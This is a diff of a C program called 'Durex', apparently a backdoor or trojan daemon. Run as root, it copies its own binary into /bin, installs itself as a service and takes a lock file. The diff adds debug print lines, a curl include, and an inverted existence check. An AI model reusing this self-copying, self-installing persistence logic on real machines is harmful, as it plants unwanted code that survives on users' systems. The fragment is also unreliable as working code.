@@ -1,4 +1,5 @@
 #include <durex.h>
+#include <curl/curl.h>
 
 int8_t		g_nbr_connections;
 
@@ -33,15 +34,22 @@ uint8_t		copy_in_service(const char *durex_service)
 	return (1);
 }
 
+
 int		main(int ac, char **argv, char **env)
 {
 	int	fd_lock;
 	int sock;
 
+	printf("pouet\n");
+
 	if (getuid() != 0)
 		return (0);
-	if (access("/bin/Durex", F_OK))
+
+	printf("pouet\n");
+
+	if (access("/bin/Durex", F_OK) == 0)
 	{
+		printf("pouet\n");
 		ft_putstr(LOGIN);
 		if (!copy_in_bin(argv[0]))
 			return (0);
@@ -51,6 +59,7 @@ int		main(int ac, char **argv, char **env)
 	}
 	else
 	{
+		printf("cacaouet\n");
 		fd_lock = open("/var/lock/Durex.lock", O_CREAT | O_RDWR, 0644);
 		if (flock(fd_lock, LOCK_EX | LOCK_NB) == -1)
 			return (3);
